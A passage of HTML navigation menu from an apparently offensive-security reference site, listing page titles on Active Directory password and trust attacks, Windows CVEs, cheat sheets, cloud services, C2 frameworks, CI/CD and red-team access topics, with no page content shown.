      <a href="../pwd-group-policy-preferences/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - Group Policy Preferences
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-precreated-computer/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - Pre-Created Computer Account
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-read-gmsa/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - GMSA
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-read-laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - LAPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-shadow-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - Shadow Credentials
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-spraying/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - Spraying
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../trust-pam/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Trust - Privileged Access Management
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../trust-relationship/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Trust - Relationship
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../trust-sid-hijacking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Child Domain to Forest Compromise - SID Hijacking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../trust-ticket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest to Forest Compromise - Trust Ticket
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_45" >
        
          
          <label class="md-nav__link" for="__nav_3_45" id="__nav_3_45_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    CVE
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_45_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_45">
            <span class="md-nav__icon md-icon"></span>
            CVE
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/MS14-068/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MS14-068 Checksum Validation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/NoPAC/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NoPAC / samAccountName Spoofing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/PrintNightmare/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrintNightmare
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/PrivExchange/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrivExchange
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/ZeroLogon/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ZeroLogon
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Cheatsheets
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/as-400/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AS400
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/escape-breakout/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kiosk Escape and Jail Breakout
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/hash-cracking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash Cracking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/liferay/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Liferay
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/mimikatz-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Mimikatz
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/miscellaneous-tricks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Miscellaneous &amp; Tricks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/network-discovery/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Network Discovery
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/powershell-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Powershell
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/shell-bind-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Bind Shell
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/shell-reverse-cheatsheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Reverse Shell Cheat Sheet
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/source-code-management-ci/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Source Code Management &amp; CI/CD Compromise
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Cloud
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Cloud
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
        
          
          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Aws
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_1">
            <span class="md-nav__icon md-icon"></span>
            Aws
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-access-token/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Access Token &amp; Secrets
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-cli/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - CLI
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-cognito/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - Cognito
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-dynamodb/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - DynamoDB
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ec2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - EC2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Enumerate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-iam/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Identity &amp; Access Management
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ioc-detection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - IOC &amp; Detections
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-lambda/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - Lambda &amp; API Gateway
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-metadata/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Metadata SSRF
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-s3-bucket/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - S3 Buckets
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ssm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Service - SSM
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-training/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AWS - Training
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Azure
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            Azure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/aka-ms/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    aka.ms Shortcuts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-access-and-token/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Access and Tokens
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-ad-conditional-access-policy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Conditional Access Policy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-ad-connect/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - AD Connect and Cloud Sync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-devices-users-sp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - IAM
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Enumerate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Persistence
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-phishing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure AD - Phishing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-requirements/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure - Requirements
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-application-endpoint/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Application Endpoint
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-application-proxy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Application Proxy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-container-registry/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Container Registry
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-deployment-template/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Deployment Template
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Azure DevOps
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-keyvault/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - KeyVault
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-microsoft-intune/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Microsoft Intune
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-office-365/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Office 365
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-runbook/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Runbook and Automation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-storage-blob/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Storage Blob
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-virtual-machine/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Virtual Machine
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-web-apps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - Web Apps
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-web-domains/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure Services - DNS Suffix
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
        
          
          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Ibm
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_3">
            <span class="md-nav__icon md-icon"></span>
            Ibm
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/ibm/ibm-cloud-databases/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    IBM Cloud Managed Database Services
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/ibm/ibm-cloud-object-storage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    IBM Cloud Object Storage
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Command control
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Command control
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike-beacons/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cobalt Strike - Beacons
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike-kits/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cobalt Strike - Kits
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cobalt Strike
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/metasploit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Metasploit
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/mythic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Mythic C2
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Containers
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Containers
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../containers/docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../containers/kubernetes/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kubernetes
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Databases
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Databases
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-audit-checks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Audit Checks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-command-execution/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Command Execution
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Credentials
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Database Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-linked-database/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MSSQL - Linked Database
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Devops
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            Devops
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CI/CD attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/azure-devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Azure DevOps
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/buildkite/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    BuildKite
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/circle-ci/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CircleCI
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/drone-ci/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Drone CI
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/github-actions/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GitHub Actions
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Methodology
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            Methodology
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/android-applications/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Application
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/bug-hunting-methodology/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Bug Hunting Methodology
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/source-code-analysis/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Source Code Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/vulnerability-reports/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vulnerability Reports
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
        
          
          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Redteam
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11">
            <span class="md-nav__icon md-icon"></span>
            Redteam
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_1" >
        
          
          <label class="md-nav__link" for="__nav_11_1" id="__nav_11_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Access
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_1">
            <span class="md-nav__icon md-icon"></span>
            Access
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/html-smuggling/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    HTML Smuggling
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/initial-access/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Initial Access
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/office-attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Office - Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/phishing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Phishing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/web-attack-surface/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Web Attack Surface
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/windows-download-execute/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Download and execute methods
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/windows-using-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Using credentials
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2" >
        
          
